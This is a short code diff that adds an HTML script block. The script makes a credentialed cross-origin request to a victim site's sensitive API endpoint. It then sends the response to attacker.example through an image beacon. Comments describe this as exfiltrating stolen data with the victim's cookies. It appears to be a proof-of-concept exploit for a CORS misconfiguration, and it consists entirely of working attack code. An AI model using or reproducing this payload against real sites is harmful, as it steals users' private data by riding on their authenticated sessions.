@@ -1,0 +1,10 @@
+<script>
+  var req = new XMLHttpRequest();
+  req.onload = function() {
+    // Exfiltrate the stolen data to an attacker-controlled server
+    new Image().src = 'https://attacker.example/log?data=' + encodeURIComponent(this.responseText);
+  };
+  req.open('GET', 'https://victim.example.com/api/sensitive-endpoint', true);
+  req.withCredentials = true; // This sends the victim's cookies
+  req.send();
+</script>
